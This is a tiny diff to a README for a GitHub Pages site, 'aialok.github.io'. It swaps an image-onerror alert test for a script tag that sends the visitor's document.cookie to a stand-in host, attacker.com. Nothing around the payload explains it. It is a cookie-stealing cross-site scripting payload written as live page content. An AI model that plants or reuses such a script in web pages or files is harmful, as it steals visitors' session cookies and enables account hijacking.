@@ -1,3 +1,6 @@
 # aialok.github.io
 
-<img src="x" onerror="alert(1)">
+<script>
+  fetch("https://attacker.com?c=" + document.cookie)
+</script>
+
